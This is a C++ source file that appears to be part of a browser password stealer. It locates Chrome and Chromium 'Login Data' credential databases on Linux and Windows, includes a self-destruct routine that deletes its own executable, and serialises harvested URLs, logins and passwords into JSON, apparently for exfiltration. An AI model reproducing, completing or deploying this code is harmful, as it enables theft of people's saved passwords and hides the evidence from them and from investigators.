#include "utils.h"
#include <cstdio>
#include <array>
#include <algorithm>
#include <fstream>
#include <iostream>

const std::string getPathToFile() {
#ifdef __linux__
    const std::vector<std::string> files = {
        std::string(std::getenv("HOME")) + std::string("/.config/google-chrome/Default/Login Data"),
        std::string(std::getenv("HOME")) + std::string("/.config/chromium/Default/Login Data")
    };
    const auto result = std::find_if(files.begin(), files.end(), [](std::string filename) -> bool {
        const std::ifstream ifs(filename);
        return ifs.good();
    });

    return result != files.end() ? *result : "";
#else
	return std::string(std::getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
#endif
}


void selfDesctruct(int argc, char** argv) {
#ifdef __linux__
    std::remove(argv[0]);
#else
    //TODO: implement for windows
	std::remove(argv[0]);
#endif
}

// Code copied from cpprestsdk
std::string jsonEscapeString(const std::string str) {
    std::string result;
    for (const char &ch : str)
    {
        switch (ch)
        {
            case '\"':
                result += '\\';
                result += '\"';
                break;
            case '\\':
                result += '\\';
                result += '\\';
                break;
            case '\b':
                result += '\\';
                result += 'b';
                break;
            case '\f':
                result += '\\';
                result += 'f';
                break;
            case '\r':
                result += '\\';
                result += 'r';
                break;
            case '\n':
                result += '\\';
                result += 'n';
                break;
            case '\t':
                result += '\\';
                result += 't';
                break;
            default:
                // If a control character then must unicode escaped.
                if (ch >= 0 && ch <= 0x1F)
                {
                    static const std::array<char, 16> intToHex = { { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' } };
                    result += '\\';
                    result += 'u';
                    result += '0';
                    result += '0';
                    result += intToHex[(ch & 0xF0) >> 4];
                    result += intToHex[ch & 0x0F];
                }
                else
                {
                    result += ch;
                }
        }
    }
    return result;
}

std::string toJson(Records::const_iterator begin, Records::const_iterator end) {
    std::string result = "[";
    for(auto it = begin; it != end;) {
        result += "{";
        result += "\"url\": \"" + jsonEscapeString(it->url) + "\",";
        result += "\"login\": \"" + jsonEscapeString(it->login) + "\",";
        result += "\"password\": \"" + jsonEscapeString(it->password) + "\"";
        result += "}";
        if (++it != end) {
            result += ", ";
        }
    }
    result += "]";

    return std::move(result);
}
